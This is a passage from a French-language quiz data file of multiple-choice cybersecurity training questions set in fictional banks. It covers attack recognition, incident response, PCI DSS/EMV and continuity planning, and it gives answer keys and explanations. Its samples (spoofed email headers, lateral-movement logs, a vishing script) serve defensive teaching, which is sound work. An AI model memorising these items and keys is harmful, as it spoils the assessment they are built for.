      { id: 'A', texte: "Un DDoS volumétrique visant à saturer la bande passante du lien" },
      { id: 'B', texte: "Un DDoS protocolaire visant à épuiser les tables d'état des équipements" },
      { id: 'C', texte: "Un DDoS applicatif (couche 7) visant les requêtes HTTP du portail" },
      { id: 'D', texte: "Une attaque par amplification DNS fondée sur des réflecteurs ouverts" },
    ],
    bonneReponse: 'B',
    explication:
      "Le SYN flood exploite la poignée de main TCP en trois temps : chaque SYN réserve une entrée de connexion semi-ouverte qui n'est jamais finalisée. Il épuise ainsi les ressources d'état (pare-feu, répartiteur de charge, serveur) sans saturer le lien : c'est une attaque protocolaire. Les SYN cookies et la mitigation en amont sont des contre-mesures classiques.",
    pourquoiPas: {
      A: "Une attaque volumétrique sature la bande passante ; ici le lien n'est utilisé qu'à 30 %.",
      C: "Une attaque applicative envoie des requêtes complètes et apparemment légitimes (HTTP), ce qui suppose des connexions TCP établies.",
      D: "L'amplification DNS repose sur des réponses UDP volumineuses renvoyées vers la victime : elle est volumétrique et ne produit pas de SYN en masse.",
    },
    aRetenir: "SYN flood = DDoS protocolaire : il épuise les tables d'état, pas la bande passante.",
  },
  {
    id: 'CYB-MEN-002',
    section: 'technique',
    filiere: 'cyber',
    competence: 'Menaces',
    difficulte: 'moyen',
    enonce:
      "La trésorerie de Banque Alpha reçoit à 14 h un courriel demandant d'exécuter « avant 15 h, en toute confidentialité » un virement de 2,4 millions USD pour une acquisition. Voici ses en-têtes. Quelle analyse est correcte ?",
    extrait: {
      langage: 'texte',
      contenu: `From: "Direction Générale - Banque Alpha" <dg@banque-a1pha.example>
Reply-To: dg.banquealpha@mail-perso.example
To: tresorerie@banque-alpha.example
Subject: URGENT - Virement confidentiel acquisition
Received: from mx.mail-perso.example (mx.mail-perso.example [203.0.113.66])
Authentication-Results: mx.banque-alpha.example;
  spf=pass smtp.mailfrom=banque-a1pha.example;
  dkim=none; dmarc=none`,
    },
    options: [
      { id: 'A', texte: "Le message est légitime puisque le contrôle SPF est validé (spf=pass)" },
      { id: 'B', texte: "C'est un hameçonnage de masse contenant probablement une pièce jointe piégée" },
      { id: 'C', texte: "C'est une fraude au président via un domaine typosquatté : il faut vérifier par rappel sur un numéro connu" },
      { id: 'D', texte: "Le domaine officiel banque-alpha.example a été usurpé directement faute de DMARC" },
    ],
    bonneReponse: 'C',
    explication:
      "Le domaine expéditeur « banque-a1pha » remplace le « l » par un « 1 » (typosquatting) et la réponse est détournée vers une messagerie personnelle. L'urgence, la confidentialité et le montant élevé sont typiques de la fraude au président (BEC). La parade est procédurale : rappel de l'ordonnateur sur un numéro de l'annuaire interne et double validation.",
    pourquoiPas: {
      A: "SPF prouve seulement que le serveur est autorisé pour le domaine banque-a1pha.example, qui appartient justement à l'attaquant.",
      B: "Le message est ciblé (trésorerie, prétexte crédible) et vise un virement, sans pièce jointe : c'est une fraude ciblée, pas un hameçonnage de masse.",
      D: "Le domaine qui apparaît dans l'adresse est banque-a1pha.example, distinct du domaine officiel : il n'y a pas d'usurpation directe de banque-alpha.example.",
    },
    aRetenir: "Urgence + confidentialité + virement + domaine sosie : fraude au président, on rappelle toujours sur un numéro connu.",
  },
  {
    id: 'CYB-MEN-003',
    section: 'technique',
    filiere: 'cyber',
    competence: 'Menaces',
    difficulte: 'facile',
    enonce:
      "Banque Gamma est victime d'un rançongiciel. Les attaquants annoncent qu'ils publieront des fichiers clients si la rançon n'est pas payée, même si la banque restaure ses systèmes. Comment nomme-t-on cette tactique ?",
    options: [
      { id: 'A', texte: "Un double chiffrement, chaque fichier étant chiffré avec deux clés différentes" },
      { id: 'B', texte: "Une attaque simultanée contre la production et les sauvegardes" },
      { id: 'C', texte: "Une combinaison systématique du chiffrement et d'un déni de service" },
      { id: 'D', texte: "Une double extorsion : exfiltration des données puis menace de divulgation" },
    ],
    bonneReponse: 'D',
    explication:
      "Dans la double extorsion, les attaquants exfiltrent des données avant de les chiffrer : ils peuvent ainsi menacer de les publier même si la victime restaure ses sauvegardes. Ce modèle impose de traiter aussi l'incident comme une violation de données (notification, juridique, communication), et pas seulement comme un problème de disponibilité.",
    pourquoiPas: {
      A: "Le nombre de clés de chiffrement ne crée pas de levier supplémentaire ; la double extorsion repose sur la menace de divulgation.",
      B: "Viser les sauvegardes est une pratique fréquente des rançongiciels, mais ce n'est pas ce que désigne la double extorsion.",
      C: "L'ajout d'un DDoS (ou du harcèlement des clients) relève de ce qu'on appelle parfois la triple extorsion, pas de la double.",
    },
    aRetenir: "Double extorsion = chiffrer + menacer de publier : les sauvegardes ne suffisent plus.",
  },
  {
    id: 'CYB-MEN-004',
    section: 'technique',
    filiere: 'cyber',
    competence: 'Menaces',
    difficulte: 'moyen',
    enonce:
      "Un responsable des paiements de Banque Beta reçoit un appel dont la voix est parfaitement celle de son directeur. Celui-ci exige un virement urgent vers un nouveau bénéficiaire, en invoquant une réunion qui l'empêche d'utiliser le circuit habituel. Quelle est la réaction appropriée ?",
    options: [
      { id: 'A', texte: "Raccrocher, rappeler le directeur sur son numéro de l'annuaire interne et appliquer la double validation" },
      { id: 'B', texte: "Poser une question personnelle à l'interlocuteur pour vérifier son identité avant d'exécuter" },
      { id: 'C', texte: "Exécuter le virement car la voix est reconnue et le montant reste sous le plafond" },
      { id: 'D', texte: "Demander à l'interlocuteur de confirmer sa demande par un courriel envoyé juste après l'appel" },
    ],
    bonneReponse: 'A',
    explication:
      "Les outils d'IA permettent aujourd'hui de cloner une voix à partir de quelques extraits publics (deepfake vocal) : reconnaître une voix ne prouve plus l'identité. La seule parade robuste est de vérifier par un canal indépendant initié par soi-même (rappel sur un numéro connu) et de ne jamais déroger à la procédure de double validation, quelle que soit l'urgence invoquée.",
    pourquoiPas: {
      B: "Les réponses à des questions personnelles se trouvent souvent en ligne ou ont pu être collectées en amont par l'attaquant.",
      C: "Un deepfake vocal reproduit fidèlement la voix ; un plafond ne protège pas contre des fraudes répétées ou fractionnées.",
      D: "Le courriel peut être émis par l'attaquant lui-même (domaine sosie ou boîte compromise) : la confirmation doit passer par un canal que l'on initie soi-même.",
    },
    aRetenir: "Face à une voix ou une vidéo convaincante, on vérifie par un canal indépendant que l'on initie soi-même.",
  },
  {
    id: 'CYB-MEN-005',
    section: 'technique',
    filiere: 'cyber',
    competence: 'Menaces',
    difficulte: 'difficile',
    enonce:
      "Le compte adm.helpdesk n'est normalement utilisé que depuis le bastion d'administration, en heures ouvrées. Le SIEM de Banque Alpha corrèle les événements suivants. Que faut-il en conclure ?",
    extrait: {
      langage: 'log',
      contenu: `23:12:04 SRV-FICHIERS-01  EventID=4624 LogonType=3 Account=adm.helpdesk Source=WS-COMPTA-07 AuthPackage=NTLM
23:12:09 SRV-FICHIERS-01  EventID=7045 ServiceName=PSEXESVC ImagePath=%SystemRoot%\\PSEXESVC.exe
23:13:40 SRV-PAIE-02      EventID=4624 LogonType=3 Account=adm.helpdesk Source=WS-COMPTA-07 AuthPackage=NTLM
23:13:44 SRV-PAIE-02      EventID=7045 ServiceName=PSEXESVC ImagePath=%SystemRoot%\\PSEXESVC.exe
23:15:02 SRV-COMPENS-01   EventID=4624 LogonType=3 Account=adm.helpdesk Source=WS-COMPTA-07 AuthPackage=NTLM`,
    },
    options: [
      { id: 'A', texte: "Une opération de maintenance normale, puisque le compte utilisé est valide" },
      { id: 'B', texte: "Un déni de service interne lancé depuis le poste WS-COMPTA-07" },
      { id: 'C', texte: "Une attaque de Kerberoasting visant les comptes de service des serveurs" },
      { id: 'D', texte: "Un mouvement latéral depuis un poste compromis, avec exécution à distance de type PsExec" },
    ],
    bonneReponse: 'D',
    explication:
      "Un compte d'administration est utilisé hors horaires, depuis un poste bureautique et non depuis le bastion, pour ouvrir des sessions réseau successives (type 3, NTLM) puis installer le service PSEXESVC (événement 7045) sur plusieurs serveurs. C'est la signature d'un mouvement latéral avec des identifiants volés (pass-the-hash possible) progressant vers des serveurs sensibles. Il faut isoler WS-COMPTA-07, réinitialiser le compte et rechercher d'autres compromissions.",
    pourquoiPas: {
      A: "Un compte valide n'est pas un usage légitime : la source, l'horaire et l'outil sortent tous du comportement de référence.",
      B: "Trois connexions espacées de plus d'une minute n'ont rien d'un déni de service ; elles traduisent une progression ciblée de serveur en serveur.",
      C: "Le Kerberoasting se manifeste par des demandes de tickets de service (4769), alors qu'ici on voit des ouvertures de session NTLM et des installations de service.",
    },
    aRetenir: "Compte admin hors contexte + 4624 type 3 en chaîne + 7045 PSEXESVC : mouvement latéral.",
  },
  {
    id: 'CYB-MEN-006',
    section: 'technique',
    filiere: 'cyber',
    competence: 'Menaces',
    difficulte: 'moyen',
    enonce:
      "Un bulletin de renseignement sur la menace signale un groupe APT ciblant les banques centrales et les infrastructures de paiement d'une région. Quelle description caractérise le mieux une APT ?",
    options: [
      { id: 'A', texte: "Une campagne opportuniste de pourriels envoyés en masse pour diffuser des logiciels malveillants" },
      { id: 'B', texte: "Un attaquant qui n'utilise que des failles inconnues et qui est détecté en quelques heures" },
      { id: 'C', texte: "Un acteur doté de moyens, ciblant une organisation précise et s'y maintenant longtemps et discrètement" },
      { id: 'D', texte: "Une attaque ponctuelle par déni de service à très fort volume contre un site public" },
    ],
    bonneReponse: 'C',
    explication:
      "Une APT (Advanced Persistent Threat) désigne un acteur organisé, souvent soutenu par un État ou un groupe criminel structuré, qui cible délibérément une organisation, s'y installe durablement et discrètement, et poursuit des objectifs stratégiques (espionnage, sabotage, vol de fonds). La détection repose sur la chasse aux menaces, la surveillance des comportements et le partage de renseignement.",
    pourquoiPas: {
      A: "Une campagne de masse est opportuniste, alors qu'une APT est ciblée et adaptée à sa victime.",
      B: "Une APT combine souvent des techniques connues et des failles non corrigées, et son objectif est justement de rester indétectée longtemps.",
      D: "Un DDoS ponctuel vise la disponibilité de manière bruyante ; il ne recherche ni persistance ni discrétion.",
    },
    aRetenir: "APT = ciblée, dotée de moyens, persistante et discrète.",
  },
  {
    id: 'CYB-MEN-007',
    section: 'technique',
    filiere: 'cyber',
    competence: 'Menaces',
    difficulte: 'facile',
    enonce:
      "Une agente de Banque Alpha signale la séquence ci-dessous sur son téléphone professionnel. De quelle technique d'attaque s'agit-il ?",
    extrait: {
      langage: 'texte',
      contenu: `02:07  Notification MFA « Approuver la connexion ? »  -> refusée
02:08  Notification MFA « Approuver la connexion ? »  -> refusée
[... 14 notifications entre 02:07 et 02:19 ...]
02:21  Appel : « Bonjour, ici le support informatique de Banque Alpha. Nous corrigeons
       un bug MFA, merci d'approuver la prochaine demande pour stopper les alertes. »`,
    },
    options: [
      { id: 'A', texte: "Un dysfonctionnement technique du serveur d'authentification multifacteur" },
      { id: 'B', texte: "Un bombardement de notifications MFA combiné à de l'ingénierie sociale par téléphone" },
      { id: 'C', texte: "Un détournement de carte SIM (SIM swapping) pour intercepter les SMS" },
      { id: 'D', texte: "Une force brute sur les codes à usage unique générés par l'application" },
    ],
    bonneReponse: 'B',
    explication:
      "L'attaquant, qui connaît déjà le mot de passe, multiplie les demandes d'approbation pour lasser la victime (MFA fatigue), puis se fait passer pour le support afin d'obtenir l'approbation (vishing). Il faut refuser, signaler au SOC et réinitialiser le mot de passe ; côté technique, la correspondance de nombres (number matching) limite ce type d'attaque.",
    pourquoiPas: {
      A: "Un bug ne s'accompagne pas d'un appel demandant d'approuver une connexion ; le support légitime ne demande jamais cela.",
      C: "Le SIM swapping vise à recevoir les SMS de la victime ; ici il s'agit de notifications push à approuver par la victime elle-même.",
      D: "Une force brute sur des codes OTP ne génère pas de notifications d'approbation sur le téléphone de la victime.",
    },
    aRetenir: "Notifications MFA en rafale + appel du « support » : MFA fatigue, le mot de passe est déjà compromis.",
  },

  // ─────────────────────────── Gestion d'incident ───────────────────────────
  {
    id: 'CYB-IR-001',
    section: 'technique',
    filiere: 'cyber',
    competence: 'Gestion d’incident',
    difficulte: 'moyen',
    enonce:
      "Le SIEM signale un pic de 40 000 requêtes/s vers le portail interbancaire depuis des milliers d'IP. Quelle est la PREMIÈRE action appropriée ?",
    options: [
      { id: 'A', texte: 'Éteindre les serveurs du portail' },
      { id: 'B', texte: "Activer la mitigation DDoS (scrubbing / rate limiting) et ouvrir un ticket d'incident" },
      { id: 'C', texte: 'Bloquer manuellement chaque adresse IP une par une' },
      { id: 'D', texte: 'Publier immédiatement un communiqué de presse' },
    ],
    bonneReponse: 'B',
    explication:
      "On confine en préservant la disponibilité : mitigation en amont et traçabilité de l'incident. Éteindre réalise l'objectif de l'attaquant ; le blocage IP manuel ne passe pas à l'échelle ; la communication externe suit le plan de crise, après qualification.",
    pourquoiPas: {
      A: "Éteindre le portail rend le service indisponible, ce qui est précisément l'objectif d'un déni de service.",
      C: "Des milliers d'adresses, souvent renouvelées par l'attaquant, ne peuvent pas être bloquées une à une à temps.",
      D: "La communication externe intervient après qualification de l'incident et selon le plan de communication de crise validé.",
    },
    aRetenir: "Face à un DDoS : mitiger en amont et tracer l'incident, sans couper soi-même le service.",
  },
  {
    id: 'CYB-IR-002',
    section: 'technique',
    filiere: 'cyber',
    competence: 'Gestion d’incident',
    difficulte: 'facile',
    enonce:
      "Deux semaines après la clôture d'un incident sur le switch monétique, l'équipe de Banque Beta organise une réunion de retour d'expérience pour améliorer ses procédures. Dans quelle phase du cycle de vie de NIST SP 800-61 (rév. 2) cette activité s'inscrit-elle ?",
    options: [
      { id: 'A', texte: 'Préparation' },
      { id: 'B', texte: 'Détection et analyse' },
      { id: 'C', texte: 'Activité post-incident' },
      { id: 'D', texte: 'Confinement, éradication et rétablissement' },
    ],
    bonneReponse: 'C',
    explication:
      "NIST SP 800-61 rév. 2 décrit quatre phases : préparation ; détection et analyse ; confinement, éradication et rétablissement ; activité post-incident. Le retour d'expérience (lessons learned) appartient à la dernière phase. Ses conclusions alimentent ensuite la préparation, ce qui fait du processus un cycle d'amélioration continue.",
    pourquoiPas: {
      A: "La préparation met en place les moyens avant l'incident ; elle bénéficie du retour d'expérience mais ne le contient pas.",
      B: "Cette phase consiste à repérer et qualifier l'incident, ce qui est déjà terminé ici.",
      D: "Cette phase vise à limiter, supprimer la menace et restaurer le service ; elle est achevée lorsque l'incident est clos.",
    },
    aRetenir: "NIST 800-61 : préparer, détecter-analyser, confiner-éradiquer-rétablir, puis tirer les leçons.",
  },
  {
    id: 'CYB-IR-003',
    section: 'technique',
    filiere: 'cyber',
    competence: 'Gestion d’incident',
    difficulte: 'difficile',
    enonce:
      "Un serveur de Banque Gamma, toujours allumé, est soupçonné d'héberger un logiciel malveillant résidant uniquement en mémoire. Quel ordre de collecte des preuves respecte l'ordre de volatilité (RFC 3227) ?",
    options: [
      { id: 'A', texte: "Mémoire vive et état des processus et connexions, puis fichiers temporaires, image disque et journaux centralisés" },
      { id: 'B', texte: "Image complète du disque, puis mémoire vive, puis journaux centralisés et sauvegardes" },
      { id: 'C', texte: "Journaux du SIEM et sauvegardes, puis image disque, puis mémoire vive en dernier" },
      { id: 'D', texte: "Redémarrage en mode sans échec, puis image disque, puis analyse de la mémoire vive" },
    ],
    bonneReponse: 'A',
    explication:
      "On collecte d'abord ce qui disparaît le plus vite : mémoire vive, table des processus, connexions réseau, puis les systèmes de fichiers temporaires, le disque et enfin les données distantes ou archivées, plus stables. Pour un malware résidant en mémoire, la capture de la RAM est décisive, car elle serait perdue au moindre redémarrage.",
    pourquoiPas: {
      B: "L'imagerie disque prend des heures, pendant lesquelles l'état de la mémoire évolue ou se perd.",
      C: "Les journaux centralisés et les sauvegardes sont stables : les collecter en premier sacrifie les éléments volatils.",
      D: "Redémarrer efface la mémoire vive, donc précisément la preuve d'un malware résidant en mémoire.",
    },
    aRetenir: "Ordre de volatilité : on collecte d'abord la RAM, et on ne redémarre jamais avant.",
  },
  {
    id: 'CYB-IR-004',
    section: 'technique',
    filiere: 'cyber',
    competence: 'Gestion d’incident',
    difficulte: 'moyen',
    enonce:
      "Banque Alpha envisage des poursuites contre l'auteur d'une fraude interne et saisit un disque dur. Que doit documenter la chaîne de traçabilité (chaîne de custody) de cette preuve ?",
    options: [
      { id: 'A', texte: "La liste des vulnérabilités exploitées et les correctifs appliqués après l'incident" },
      { id: 'B', texte: "Le plan de communication de crise et les messages destinés à la presse" },
      { id: 'C', texte: "Uniquement l'empreinte du disque calculée une fois l'analyse terminée" },
      { id: 'D', texte: "Qui a saisi, manipulé, transféré et stocké la preuve, quand, comment, avec ses empreintes" },
    ],
    bonneReponse: 'D',
    explication:
      "La chaîne de custody retrace sans interruption chaque personne ayant eu la preuve en main, les dates et heures, les conditions de stockage et de transfert. Une empreinte cryptographique (par exemple SHA-256) calculée dès l'acquisition puis revérifiée prouve que la preuve n'a pas été altérée. Sans cette traçabilité, la preuve peut être contestée devant une juridiction.",
    pourquoiPas: {
      A: "Les vulnérabilités et correctifs relèvent du rapport d'incident, pas de la traçabilité d'une pièce à conviction.",
      B: "Le plan de communication est un livrable de gestion de crise sans lien avec l'intégrité d'une preuve.",
      C: "Une empreinte calculée seulement après l'analyse ne prouve pas que le disque n'a pas été modifié entre la saisie et l'analyse.",
    },
    aRetenir: "Chaîne de custody : qui, quand, où, comment, et une empreinte calculée dès la saisie.",
  },
  {
    id: 'CYB-IR-005',
    section: 'technique',
    filiere: 'cyber',
    competence: 'Gestion d’incident',
    difficulte: 'moyen',
    enonce:
      "Le CSIRT de Banque Beta, en effectif réduit, doit traiter trois incidents ouverts simultanément. Dans quel ordre faut-il les prioriser ?",
    extrait: {
      langage: 'texte',
      contenu: `INC-0412  Poste du service courrier : clic sur un lien d'hameçonnage. L'EDR a bloqué
          l'exécution ; aucun autre signe de compromission.
INC-0413  Serveur de compensation SRV-COMPENS-01 : chiffrement de fichiers en cours,
          partages réseau touchés. Prochaine fenêtre de compensation à 16h00.
INC-0414  Site web institutionnel : défiguration de la page « Actualités »
          (contenu statique, aucune donnée sensible).`,
    },
    options: [
      { id: 'A', texte: "INC-0413, puis INC-0414, puis INC-0412" },
      { id: 'B', texte: "INC-0412, puis INC-0413, puis INC-0414, selon l'ordre d'arrivée" },
      { id: 'C', texte: "INC-0414 d'abord, car il est visible du public, puis INC-0413 et INC-0412" },
      { id: 'D', texte: "Les trois en parallèle, avec le même niveau de priorité" },
    ],
    bonneReponse: 'A',
    explication:
      "NIST SP 800-61 recommande de prioriser selon l'impact fonctionnel, l'impact sur l'information et la capacité de rétablissement. Le rançongiciel actif sur un serveur de compensation menace une fonction critique et se propage : il passe en premier. La défiguration touche la réputation sans données sensibles, et l'hameçonnage bloqué par l'EDR présente un impact faible, à vérifier ensuite.",
    pourquoiPas: {
      B: "L'ordre d'arrivée ignore l'impact : on laisserait un chiffrement actif progresser pendant le traitement d'un incident déjà contenu.",
      C: "La visibilité publique ne prime pas sur l'arrêt d'une fonction critique de paiement en cours de chiffrement.",
      D: "Avec une équipe réduite, tout traiter au même niveau dilue l'effort et retarde le confinement de l'incident le plus grave.",
    },
    aRetenir: "On priorise par impact métier et propagation, pas par ordre d'arrivée ni par visibilité.",
  },
  {
    id: 'CYB-IR-006',
    section: 'technique',
    filiere: 'cyber',
    competence: 'Gestion d’incident',
    difficulte: 'facile',
    enonce:
      "Un agent de Banque Gamma signale que ses fichiers prennent l'extension « .lockd » et qu'une note de rançon s'affiche. Selon un playbook rançongiciel classique, quel est le premier geste ?",
    options: [
      { id: 'A', texte: "Éteindre immédiatement le poste en coupant l'alimentation" },
      { id: 'B', texte: "Contacter les attaquants pour négocier le montant de la rançon" },
      { id: 'C', texte: "Isoler le poste du réseau sans l'éteindre, puis alerter le CSIRT" },
      { id: 'D', texte: "Restaurer tout de suite les fichiers depuis la sauvegarde sur le même poste" },
    ],
    bonneReponse: 'C',
    explication:
      "L'isolement réseau (câble débranché, isolation par l'EDR, Wi-Fi coupé) stoppe la propagation vers les partages et les autres machines, tout en conservant la mémoire vive pour l'investigation. Le CSIRT déroule ensuite le playbook : identification de la souche, recherche d'autres postes touchés, éradication puis restauration.",
    pourquoiPas: {
      A: "Couper l'alimentation détruit les preuves en mémoire, parfois utiles à l'investigation ; l'isolement réseau suffit à stopper la propagation.",
      B: "La négociation, si elle est envisagée, relève de la direction et du juridique, jamais d'un premier réflexe individuel.",
      D: "Restaurer avant d'avoir éradiqué la menace et mesuré l'étendue de l'attaque expose les données restaurées à un nouveau chiffrement.",
    },
    aRetenir: "Rançongiciel sur un poste : on isole du réseau, on n'éteint pas, on alerte.",
  },
  {
    id: 'CYB-IR-007',
    section: 'technique',
    filiere: 'cyber',
    competence: 'Gestion d’incident',
    difficulte: 'moyen',
    enonce:
      "Pendant une investigation sur une intrusion chez Banque Alpha, le SIEM lève l'alerte ci-dessous. Comment la cellule de crise doit-elle organiser ses communications internes ?",
    extrait: {
      langage: 'log',
      contenu: `[ALERTE CRITIQUE] 2026-09-03 09:41:22 MAIL-01
Règle de transfert automatique créée sur 42 boîtes (dont DG, DSI, RSSI)
Destination : collecte@mail-ext.example
Création via session d'administration depuis 10.4.2.31`,
    },
    options: [
      { id: 'A', texte: "Envoyer un courriel à tout le personnel détaillant l'investigation en cours" },
      { id: 'B', texte: "Basculer sur un canal hors bande prévu au plan de crise, distinct de la messagerie compromise" },
      { id: 'C', texte: "Répondre à l'adresse de collecte pour avertir l'attaquant qu'il a été détecté" },
      { id: 'D', texte: "Suspendre toute communication interne jusqu'à la fin de l'éradication" },
    ],
    bonneReponse: 'B',
    explication:
      "La messagerie étant compromise, il faut considérer que l'attaquant lit les courriels, y compris ceux de la cellule de crise. Le plan de crise doit prévoir un canal hors bande (annuaire téléphonique de crise, messagerie indépendante) afin de coordonner la réponse sans alerter l'attaquant ni lui révéler les mesures en préparation.",
    pourquoiPas: {
      A: "Un courriel interne serait copié vers l'adresse de l'attaquant, qui connaîtrait alors l'avancement de l'investigation.",
      C: "Prévenir l'attaquant l'incite à effacer ses traces ou à accélérer son action avant le confinement.",
      D: "Une crise exige une coordination constante ; il faut changer de canal, pas cesser de communiquer.",
    },
    aRetenir: "Si la messagerie est compromise, la cellule de crise communique hors bande.",
  },

  // ───────────────────────────── PCI-DSS & EMV ─────────────────────────────
  {
    id: 'CYB-PCI-001',
    section: 'technique',
    filiere: 'cyber',
    competence: 'PCI-DSS & EMV',
    difficulte: 'facile',
    enonce:
      "Selon PCI DSS v4.0, quelle donnée le switch monétique de Banque Beta ne doit-il jamais conserver après l'autorisation d'une transaction, même chiffrée ?",
    options: [
      { id: 'A', texte: "Le cryptogramme visuel (CVV2 / CVC2) imprimé au dos de la carte" },
      { id: 'B', texte: "Le numéro de carte (PAN), protégé par chiffrement ou tokenisation" },
      { id: 'C', texte: "Le nom du porteur associé à la transaction" },
      { id: 'D', texte: "La date d'expiration de la carte" },
    ],
    bonneReponse: 'A',
    explication:
      "Le CVV2 fait partie des données sensibles d'authentification, avec le contenu complet de la piste (ou son équivalent sur la puce) et le PIN ou bloc PIN. PCI DSS interdit de les conserver après autorisation, même chiffrés (exigence 3.3.1), sauf exception strictement encadrée pour les émetteurs. Le PAN, le nom et la date d'expiration peuvent être conservés s'ils sont justifiés et protégés.",
    pourquoiPas: {
      B: "Le PAN peut être stocké s'il existe un besoin métier, à condition d'être rendu illisible (chiffrement fort, tokenisation, hachage).",
      C: "Le nom du porteur est une donnée du titulaire de carte dont le stockage est autorisé sous protection.",
      D: "La date d'expiration est également une donnée du titulaire de carte, conservable si elle est protégée.",
    },
    aRetenir: "CVV, piste complète et PIN : jamais conservés après autorisation, même chiffrés.",
  },
  {
    id: 'CYB-PCI-002',
    section: 'technique',
    filiere: 'cyber',
    competence: 'PCI-DSS & EMV',
    difficulte: 'moyen',
    enonce:
      "Le centre d'appels de Banque Alpha affiche le numéro de carte du client à l'écran. Les agents n'ont pas besoin du PAN complet. Parmi les formats ci-dessous, lesquels respectent la règle générale de masquage de PCI DSS ?",
    extrait: {
      langage: 'texte',
      contenu: `Format 1 : 4970 1012 3456 7890
Format 2 : 4970 10** **** 7890
Format 3 : 4970 1012 34** 7890
Format 4 : **** **** **** 7890`,
    },
    options: [
      { id: 'A', texte: 'Les formats 1 et 2' },
      { id: 'B', texte: 'Les formats 2 et 3' },
      { id: 'C', texte: 'Le format 4 uniquement' },
      { id: 'D', texte: 'Les formats 2 et 4' },
    ],
    bonneReponse: 'D',
    explication:
      "En règle générale, le PAN affiché à une personne sans besoin métier du numéro complet ne doit révéler au maximum que les six premiers chiffres (BIN) et les quatre derniers. Le format 2 atteint ce maximum et le format 4, plus restrictif, le respecte aussi. Pour des agents qui doivent seulement identifier la carte, le format 4 est même préférable (moindre privilège).",
    pourquoiPas: {
      A: "Le format 1 affiche le PAN complet, ce qui est interdit pour des utilisateurs sans besoin métier.",
      B: "Le format 3 affiche dix premiers chiffres, au-delà du maximum autorisé de six.",
      C: "Le format 4 est conforme, mais le format 2 l'est aussi puisqu'il ne dépasse pas six premiers et quatre derniers chiffres.",
    },
    aRetenir: "Masquage du PAN : au plus les 6 premiers et les 4 derniers chiffres, et moins si possible.",
  },
  {
    id: 'CYB-PCI-003',
    section: 'technique',
    filiere: 'cyber',
    competence: 'PCI-DSS & EMV',
    difficulte: 'difficile',
    enonce:
      "Le switch monétique de Banque Beta partage aujourd'hui un réseau plat avec la bureautique, ce qui place tout le parc dans le périmètre PCI DSS. Quelle démarche permet de réduire légitimement ce périmètre ?",
    options: [
      { id: 'A', texte: "Créer un VLAN distinct pour le switch, sans règle de filtrage entre les VLAN" },
      { id: 'B', texte: "Isoler le CDE dans un segment filtré n'autorisant que les flux nécessaires, et tester la segmentation" },
      { id: 'C', texte: "Chiffrer les PAN en base de données, ce qui sort automatiquement la bureautique du périmètre" },
      { id: 'D', texte: "Déclarer la bureautique hors périmètre dans le rapport, car aucun PAN n'y est stocké" },
    ],
    bonneReponse: 'B',
    explication:
      "Tout système qui stocke, traite ou transmet des données de carte, ou qui peut se connecter au CDE ou en affecter la sécurité, est dans le périmètre. Une segmentation effective, avec des contrôles d'accès stricts limitant les flux au nécessaire, permet d'en exclure la bureautique. PCI DSS v4.0 exige d'en vérifier l'efficacité par des tests d'intrusion au moins annuels (tous les six mois pour les prestataires de services).",
    pourquoiPas: {
      A: "Un VLAN sans filtrage laisse la bureautique joindre librement le CDE : ce n'est pas une segmentation au sens de PCI DSS.",
      C: "Le chiffrement protège les données stockées mais ne retire pas du périmètre les systèmes capables de se connecter au CDE.",
      D: "Le périmètre se détermine par les flux et la connectivité, pas par la seule absence de PAN stockés ; une déclaration non étayée serait non conforme.",
    },
    aRetenir: "Moins de systèmes connectés au CDE = moins de périmètre, à condition que la segmentation soit filtrée et testée.",
  },
  {
    id: 'CYB-PCI-004',
    section: 'technique',
    filiere: 'cyber',
    competence: 'PCI-DSS & EMV',
    difficulte: 'moyen',
    enonce:
      "Lors d'une campagne de fraude, des données de cartes de Banque Gamma ont été copiées sur des distributeurs piégés. Pourquoi la puce EMV protège-t-elle mieux contre le clonage que la piste magnétique ?",
    options: [
      { id: 'A', texte: "La puce chiffre le PAN pour qu'il ne soit jamais transmis au réseau d'acceptation" },
      { id: 'B', texte: "La puce rend la saisie du PIN obligatoire pour toutes les transactions sans exception" },
      { id: 'C', texte: "La puce génère pour chaque transaction un cryptogramme dynamique avec une clé non extractible" },
      { id: 'D', texte: "Le CVV2 imprimé au dos de la carte change automatiquement à chaque transaction" },
    ],
    bonneReponse: 'C',
    explication:
      "La piste magnétique contient des données statiques qu'il suffit de copier pour fabriquer une carte clonée. La puce EMV calcule pour chaque transaction un cryptogramme (ARQC) à partir d'une clé secrète qui ne quitte pas la puce et de données propres à la transaction : une copie des données ne permet pas de produire un cryptogramme valide. Il faut néanmoins surveiller et limiter le repli (fallback) vers la piste magnétique.",
    pourquoiPas: {
      A: "Le PAN est bien transmis lors d'une transaction EMV ; la protection vient du cryptogramme, pas de la dissimulation du PAN.",
      B: "Selon le contexte, la méthode de vérification du porteur peut être la signature, le sans-contact sans PIN ou l'absence de vérification.",
      D: "Le CVV2 est une valeur statique imprimée destinée aux paiements à distance ; il n'est pas lié au mécanisme de la puce.",
    },
    aRetenir: "EMV = cryptogramme dynamique par transaction : copier les données ne suffit plus à cloner la carte.",
  },

  // ─────────────────────────────── PCA & PRA ───────────────────────────────
  {
    id: 'CYB-PCA-001',
    section: 'technique',
    filiere: 'cyber',
    competence: 'PCA & PRA',
    difficulte: 'moyen',
    enonce:
      "Le système de règlement brut en temps réel (RTGS) de Banque Alpha a subi la panne décrite ci-dessous. Les objectifs de reprise ont-ils été respectés ?",
    extrait: {
      langage: 'texte',
      contenu: `Objectifs : RTO = 4 h ; RPO = 1 h
Sauvegardes : toutes les 4 heures (00h00, 04h00, 08h00, 12h00...)
Panne majeure : 10h30, restauration depuis la dernière sauvegarde disponible
Service rétabli : 13h45`,
    },
    options: [
      { id: 'A', texte: "RTO respecté (3 h 15 d'interruption), RPO non respecté (2 h 30 de données perdues)" },
      { id: 'B', texte: "RTO et RPO respectés, puisque le service a été rétabli en moins de 4 heures" },
      { id: 'C', texte: "RTO non respecté (3 h 15 d'interruption), RPO respecté (1 h de données perdues)" },
      { id: 'D', texte: "RTO non respecté (5 h 45 depuis la sauvegarde), RPO respecté grâce aux sauvegardes" },
    ],
    bonneReponse: 'A',
    explication:
      "Le RTO mesure la durée d'interruption tolérable : de 10h30 à 13h45, soit 3 h 15, sous les 4 h visées. Le RPO mesure la perte de données tolérable : la dernière sauvegarde datant de 08h00, 2 h 30 de transactions sont perdues, au-delà de l'objectif d'1 h. Une fréquence de sauvegarde de 4 h ne peut pas, par construction, garantir un RPO d'1 h.",
    pourquoiPas: {
      B: "Le RTO est bien respecté, mais 2 h 30 de données perdues dépassent le RPO d'1 h.",
      C: "3 h 15 est inférieur au RTO de 4 h, et la perte réelle est de 2 h 30, pas d'1 h.",
